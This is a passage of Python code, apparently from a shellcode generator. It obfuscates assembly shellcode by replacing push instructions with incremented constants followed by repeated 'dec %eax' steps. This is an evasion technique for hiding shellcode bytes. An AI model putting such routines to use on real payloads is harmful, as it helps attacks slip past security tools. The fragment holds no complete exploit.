					ebx_2 = line.rsplit('push')[1].rsplit('$0x')[1]
					n = 0
					while n<times:
						ebx_2 = "%x" % (int(ebx_2, 16) + int('01', 16))
						n+= 1
					dec = 'dec %eax\n' * n
					command = '\npush $0x%s\npop %%eax\n%spush %%eax\n'%(str(ebx_2),str(dec))
					shellcode = shellcode.replace(line,command)


	if 'write(' in job:
		shellcode = 'N' + shellcode
	return shellcode
